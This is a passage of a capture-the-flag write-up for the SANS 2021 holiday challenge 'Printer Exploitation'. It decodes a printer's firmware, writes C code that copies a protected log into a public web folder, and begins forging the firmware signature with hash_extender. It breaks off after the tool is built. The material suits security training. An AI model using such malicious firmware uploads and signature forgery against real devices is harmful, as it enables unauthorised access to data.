
<!DOCTYPE html>

<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Printer Exploitation &#8212; SANS Xmas Challenge 2021</title>
    
  <link rel="stylesheet" href="_static/css/index.73d71520a4ca3b99cfee5594769eaaae.css">

    
  <link rel="stylesheet"
    href="_static/vendor/fontawesome/5.13.0/css/all.min.css">
  <link rel="preload" as="font" type="font/woff2" crossorigin
    href="_static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
  <link rel="preload" as="font" type="font/woff2" crossorigin
    href="_static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">

    
      
  <link rel="stylesheet"
    href="_static/vendor/open-sans_all/1.44.1/index.css">
  <link rel="stylesheet"
    href="_static/vendor/lato_latin-ext/1.44.1/index.css">

    
    <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
    <link rel="stylesheet" href="_static/sphinx-book-theme.40e2e510f6b7d1648584402491bb10fe.css" type="text/css" />
    <link rel="stylesheet" type="text/css" href="_static/togglebutton.css" />
    <link rel="stylesheet" type="text/css" href="_static/copybutton.css" />
    <link rel="stylesheet" type="text/css" href="_static/mystnb.css" />
    <link rel="stylesheet" type="text/css" href="_static/sphinx-thebe.css" />
    <link rel="stylesheet" type="text/css" href="_static/panels-main.c949a650a448cc0ae9fd3441c0e17fb0.css" />
    <link rel="stylesheet" type="text/css" href="_static/panels-variables.06eb56fa6e07937060861dad626602ad.css" />
    
  <link rel="preload" as="script" href="_static/js/index.3da636dd464baa7582d2.js">

    <script id="documentation_options" data-url_root="./" src="_static/documentation_options.js"></script>
    <script src="_static/jquery.js"></script>
    <script src="_static/underscore.js"></script>
    <script src="_static/doctools.js"></script>
    <script src="_static/language_data.js"></script>
    <script src="_static/togglebutton.js"></script>
    <script src="_static/clipboard.min.js"></script>
    <script src="_static/copybutton.js"></script>
    <script >var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
    <script src="_static/sphinx-book-theme.d31b09fe5c1d09cb49b26a786de4a05d.js"></script>
    <script async="async" src="https://unpkg.com/thebelab@latest/lib/index.js"></script>
    <script >
        const thebe_selector = ".thebe"
        const thebe_selector_input = "pre"
        const thebe_selector_output = ".output"
    </script>
    <script async="async" src="_static/sphinx-thebe.js"></script>
    <link rel="index" title="Index" href="genindex.html" />
    <link rel="search" title="Search" href="search.html" />
    <link rel="next" title="8. Kerberoasting" href="objective8.html" />
    <link rel="prev" title="7. Printer Exploitation" href="objective7.html" />

    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="docsearch:language" content="en" />



  </head>
  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
    

    <div class="container-xl">
      <div class="row">
          
<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
    
        <div class="navbar-brand-box">
<a class="navbar-brand text-wrap" href="index.html">
  
  <img src="_static/logo.png" class="logo" alt="logo">
  
  
  <h1 class="site-logo" id="site-title">SANS Xmas Challenge 2021</h1>
  
</a>
</div><form class="bd-search d-flex align-items-center" action="search.html" method="get">
  <i class="icon fas fa-search"></i>
  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
</form>
<nav class="bd-links" id="bd-docs-nav" aria-label="Main navigation">
    <ul class="nav sidenav_l1">
 <li class="toctree-l1">
  <a class="reference internal" href="intro.html">
   Christmas Challenge 2021 Report
  </a>
 </li>
</ul>
<ul class="current nav sidenav_l1">
 <li class="toctree-l1">
  <a class="reference internal" href="objective1.html">
   1. The Beginning
  </a>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective2.html">
   2. Caramel Santaigo
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge2.html">
     Exif Metadata
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge2.html">
     Track the Elf!
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective3.html">
   3. Thaw Frost Tower’s Entrance
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge3.html">
     Grepping for Gold
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge3.html">
     WiFi &amp; Door Defrost
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective4.html">
   4. Slot Machine Investigation
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge4.html">
     Logic Munchers
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge4.html">
     Slot Machine Hijack
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective5.html">
   5. Strange USB Device
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge5.html">
     IPv6 Sandbox
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge5.html">
     Rubber Ducky
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective6.html">
   6. Shellcode Primer
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge6.html">
     Holiday Hero
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge6.html">
     Assembly x86
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 current active collapsible-parent">
  <a class="reference internal" href="objective7.html">
   7. Printer Exploitation
  </a>
  <ul class="current collapse-ul">
   <li class="toctree-l2 current active">
    <a class="current reference internal" href="#">
     Printer Exploitation
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective8.html">
   8. Kerberoasting
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge8.html">
     HoHo… No (Fail2Ban)
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge8.html">
     Windows AD Exploit
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective9.html">
   9. Splunk!
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge9.html">
     YARA Analysis
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge9.html">
     Splunk
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective10.html">
   10. Now Hiring!
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge10.html">
     IMDS Exploration
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge10.html">
     Frost Tower Challenge
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective11.html">
   11. Customer Complaint Analysis
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge11.html">
     Strace Ltrace Retrace
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge11.html">
     Wireshark
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective12.html">
   12. Frost Tower Website Checkup
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge12.html">
     Python Game
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge12.html">
     SQL Injection
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective13.html">
   13. FPGA Programming
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge13.html">
     FPGA Programming - Prechallenge
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge13.html">
     FPGA Programming - Challenge
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
</ul>

</nav> <!-- To handle the deprecated key -->

<div class="navbar_extra_footer">
  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
</div>

</div>


          


          
<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
    
    <div class="row topbar fixed-top container-xl">
    <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show">
    </div>
    <div class="col pl-2 topbar-main">
        
        <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
            data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
            aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
            title="Toggle navigation" data-toggle="tooltip" data-placement="left">
            <i class="fas fa-bars"></i>
            <i class="fas fa-arrow-left"></i>
            <i class="fas fa-arrow-up"></i>
        </button>
        
        
<div class="dropdown-buttons-trigger">
    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
            class="fas fa-download"></i></button>

    <div class="dropdown-buttons">
        <!-- ipynb file if we had a myst markdown file -->
        
        <!-- Download raw file -->
        <a class="dropdown-buttons" href="_sources/challenge7.md"><button type="button"
                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                data-placement="left">.md</button></a>
        <!-- Download PDF via print -->
        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
            onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
    </div>
</div>

        <!-- Source interaction buttons -->


        <!-- Full screen (wrap in <a> to have style consistency -->
        <a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
                data-placement="bottom" onclick="toggleFullScreen()" aria-label="Fullscreen mode"
                title="Fullscreen mode"><i
                    class="fas fa-expand"></i></button></a>

        <!-- Launch buttons -->

    </div>

    <!-- Table of contents -->
    <div class="d-none d-md-block col-md-2 bd-toc show">
        
        <div class="tocsection onthispage pt-5 pb-3">
            <i class="fas fa-list"></i> Contents
        </div>
        <nav id="bd-toc-nav">
            <ul class="nav section-nav flex-column">
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#firmware-download-understand-it">
   Firmware: Download &amp; Understand it!
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#firmware-decode-it">
   Firmware: Decode it!
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#linux-commands">
     Linux Commands
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#cyberchef">
     CyberChef
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#firmare-edit-it">
   Firmare: Edit it!
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#firmware-hijack-it">
   Firmware: Hijack it!
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#firmware-update-upload-it">
   Firmware: Update&amp;Upload it!
  </a>
 </li>
</ul>

        </nav>
        
    </div>
</div>
    <div id="main-content" class="row">
        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
        
              <div>
                
  <div class="section" id="printer-exploitation">
<span id="ch7"></span><h1>Printer Exploitation<a class="headerlink" href="#printer-exploitation" title="Permalink to this headline">¶</a></h1>
<p>To complete this challenge we have to read the contents of /var/spool/printer.log</p>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>To complete this particular challenge a linux computer is very useful.</p>
</div>
<p>First of all, let’s explore the website of this challenge, https://printer.kringlecastle.com <br>
There are four tabs on the left. The <strong>Firmware Update</strong> one is pretty interesting</p>
<div class="section" id="firmware-download-understand-it">
<h2>Firmware: Download &amp; Understand it!<a class="headerlink" href="#firmware-download-understand-it" title="Permalink to this headline">¶</a></h2>
<p>In Firmware Update tab click on <a class="reference external" href="https://printer.kringlecastle.com/firmware/download"><strong>Download current firmware</strong></a>. <br>
The file we download is called <code class="docutils literal notranslate"><span class="pre">firmware-export.json</span></code>. Let’s open it.</p>
<div class="highlight-Json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">&quot;firmware&quot;</span><span class="p">:</span><span class="s2">&quot;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&quot;</span><span class="p">,</span><span class="nt">&quot;signature&quot;</span><span class="p">:</span><span class="s2">&quot;2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97&quot;</span><span class="p">,</span><span class="nt">&quot;secret_length&quot;</span><span class="p">:</span><span class="mi">16</span><span class="p">,</span><span class="nt">&quot;algorithm&quot;</span><span class="p">:</span><span class="s2">&quot;SHA256&quot;</span><span class="p">}</span>
</pre></div>
</div>
<p>There are 4 fields:</p>
<ol class="simple">
<li><p><strong>firmware:</strong> this a a very long string probably base64-encoded. Strange, we were expecting a file, but a string can’t be file. <strong>Or can it?!</strong>  We’ll see that in a moment.</p></li>
<li><p><strong>signature:</strong> this is the hash of the firmware. A security measure.</p></li>
<li><p><strong>secret lenght:</strong> the lenght of the secret used to hash. We’ll need this later</p></li>
<li><p><strong>algorithm:</strong> well…now we know that the hash is a <strong>SHA256</strong>. We’ll also need this later</p></li>
</ol>
</div>
<div class="section" id="firmware-decode-it">
<h2>Firmware: Decode it!<a class="headerlink" href="#firmware-decode-it" title="Permalink to this headline">¶</a></h2>
<p>There are two ways to decode the string, <a class="reference internal" href="#ch7-linuxcommands"><span class="std std-ref">Linux Commands</span></a> and <a class="reference internal" href="#ch7-cyberchef"><span class="std std-ref">CyberChef</span></a></p>
<div class="section" id="linux-commands">
<span id="ch7-linuxcommands"></span><h3>Linux Commands<a class="headerlink" href="#linux-commands" title="Permalink to this headline">¶</a></h3>
<p>First of all, copy the <strong>base64-encoded string</strong> (firmware) and put in into a file. You can use <code class="docutils literal notranslate"><span class="pre">nano</span></code>, <code class="docutils literal notranslate"><span class="pre">vi</span></code> or whatever you want. Let’s call this file <code class="docutils literal notranslate"><span class="pre">original_firmware.b64</span></code>. <br></p>
<p>Now we can use <code class="docutils literal notranslate"><span class="pre">base64</span> <span class="pre">-d</span></code> to decode this file, and redirect the output in another file.</p>
<div class="highlight-Shell notranslate"><div class="highlight"><pre><span></span>$ base64 -d original_firmware.b64 &gt; original_firmware
</pre></div>
</div>
<p>Now, if we try to print the contents of the decoded file with <code class="docutils literal notranslate"><span class="pre">cat</span></code> we see some strange characters, which mean that this is a binary file, and cannot be printed. <br>
We can try to use <code class="docutils literal notranslate"><span class="pre">file</span></code> to see the file type</p>
<div class="highlight-Shell notranslate"><div class="highlight"><pre><span></span>$ file original_firmware

original_firmware: Zip archive data, at least v2.0 to extract
</pre></div>
</div>
<p>Oh, looks like the file is a zipfile! Let’s unzip it.</p>
<div class="highlight-Shell notranslate"><div class="highlight"><pre><span></span>$ unzip original_firmware

Archive:  original_firmware
  inflating: firmware.bin

$ file firmware.bin

firmware.bin: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">3</span>.2.0, BuildID<span class="o">[</span>sha1<span class="o">]=</span>fc77960dcdd5219c01440f1043b35a0ef0cce3e2, not stripped
</pre></div>
</div>
<p>Now we have the actual <em>firmware executable</em>. Since it is compiled, we can’t just read it, or decompile it, but we may be able to <em>replace</em> it!</p>
</div>
<div class="section" id="cyberchef">
<span id="ch7-cyberchef"></span><h3>CyberChef<a class="headerlink" href="#cyberchef" title="Permalink to this headline">¶</a></h3>
<p>Vis
First of all, visit the <a class="reference external" href="https://gchq.github.io/CyberChef/">CyberChef Website</a>. <br></p>
<ul class="simple">
<li><p>Copy the <strong>base64-encoded string</strong> (firmware) and put it in the <strong>Input</strong> textbox.</p></li>
<li><p>Drag “<strong>From Base64</strong>” into the recipe list.</p></li>
</ul>
<p>Ok, we have decoded the base64 string now, but what is this <em>strange</em> thing?? <br>
We can try to use the <strong>Magic</strong> (that’s the actual name!) operation to know more about this text.</p>
<ul class="simple">
<li><p>Drag “<strong>Magic</strong>” into the recipe list.</p></li>
</ul>
<p>In the output we can see that the <strong>Magic</strong> function suggests to <strong>Unzip</strong> it. Click on unzip. <br>
<br>
Yes! We found the actual <em>firmware executable</em>. As I said during the linux method, since it is compiled, we can’t just read it, or decompile it, but we may be able to <em>replace</em> it!</p>
</div>
</div>
<div class="section" id="firmare-edit-it">
<h2>Firmare: Edit it!<a class="headerlink" href="#firmare-edit-it" title="Permalink to this headline">¶</a></h2>
<p>Now we need a way to retrive the file (<code class="docutils literal notranslate"><span class="pre">/var/spool/printer.log</span></code>) we need to complete this challenge. We could do that by uploading a custom firmware that copies that file into <code class="docutils literal notranslate"><span class="pre">/app/lib/public/incoming</span></code> path, which is accessible from outside. Let’s do it! <br>
<br>
We wrote a program in C, but you could do the same thing with a simple bash script as well. <br></p>
<p>This is the code</p>
<div class="highlight-C notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">   </span><span class="kt">char</span><span class="w"> </span><span class="n">ch</span><span class="p">;</span><span class="w"></span>
<span class="w">   </span><span class="kt">char</span><span class="w"> </span><span class="n">source_file</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span><span class="o">=</span><span class="s">&quot;/var/spool/printer.log&quot;</span><span class="p">;</span><span class="w"></span>
<span class="w">   </span><span class="c1">//usjhsyehdgsttey53 is a random string which we used as the copied file name</span>
<span class="w">   </span><span class="kt">char</span><span class="w"> </span><span class="n">target_file</span><span class="p">[</span><span class="mi">43</span><span class="p">]</span><span class="o">=</span><span class="s">&quot;/app/lib/public/incoming/usjhsyehdgsttey53&quot;</span><span class="p">;</span><span class="w"></span>
<span class="w">   </span><span class="kt">FILE</span><span class="w"> </span><span class="o">*</span><span class="n">source</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">target</span><span class="p">;</span><span class="w"></span>


<span class="w">   </span><span class="n">source</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fopen</span><span class="p">(</span><span class="n">source_file</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;r&quot;</span><span class="p">);</span><span class="w"></span>

<span class="w">   </span><span class="k">if</span><span class="p">(</span><span class="w"> </span><span class="n">source</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="p">)</span><span class="w"></span>
<span class="w">   </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span><span class="w"></span>
<span class="w">   </span><span class="p">}</span><span class="w"></span>

<span class="w">   </span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fopen</span><span class="p">(</span><span class="n">target_file</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;w&quot;</span><span class="p">);</span><span class="w"></span>

<span class="w">   </span><span class="k">if</span><span class="p">(</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="p">)</span><span class="w"></span>
<span class="w">   </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="n">fclose</span><span class="p">(</span><span class="n">source</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span><span class="w"></span>
<span class="w">   </span><span class="p">}</span><span class="w"></span>

<span class="w">   </span><span class="k">while</span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">ch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fgetc</span><span class="p">(</span><span class="n">source</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">EOF</span><span class="w"> </span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="n">fputc</span><span class="p">(</span><span class="n">ch</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">);</span><span class="w"></span>


<span class="w">   </span><span class="n">fclose</span><span class="p">(</span><span class="n">source</span><span class="p">);</span><span class="w"></span>
<span class="w">   </span><span class="n">fclose</span><span class="p">(</span><span class="n">target</span><span class="p">);</span><span class="w"></span>
<span class="w">   </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</pre></div>
</div>
<p>Now build this code using <code class="docutils literal notranslate"><span class="pre">gcc</span></code></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">gcc</span> <span class="n">firmware</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">firmware</span><span class="o">.</span><span class="n">bin</span>
</pre></div>
</div>
<div class="admonition caution">
<p class="admonition-title">Caution</p>
<p>This command outputs our new firmware as <code class="docutils literal notranslate"><span class="pre">firmware.bin</span></code>, we can’t change that since the server requires that as the file name, so <strong>be careful not to mix <ins>YOUR firmware.bin with the original firmware.bin!</ins></strong></p>
</div>
<p>Now that we have the modified firmware, let’s zip it so it’s the same as the original one.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">zip</span> <span class="n">copy</span><span class="o">.</span><span class="n">zip</span> <span class="n">firmware</span><span class="o">.</span><span class="n">bin</span>
</pre></div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>The new zip-file name can be whatever you want. We called it <strong>copy.zip</strong></p>
</div>
<p>We are almost ready to upload it. First, we have to hijack the signature</p>
</div>
<div class="section" id="firmware-hijack-it">
<h2>Firmware: Hijack it!<a class="headerlink" href="#firmware-hijack-it" title="Permalink to this headline">¶</a></h2>
<p>Before hijacking the signature, we need the tools to do it. We used <a class="reference external" href="https://github.com/iagox86/hash_extender">Hash Extender by Ron Bowes</a>. Let’s clone and build it!</p>
<div class="highlight-Bash notranslate"><div class="highlight"><pre><span></span>$ git clone https://github.com/iagox86/hash_extender.git
$ <span class="nb">cd</span> hash_extender
$ make
</pre></div>
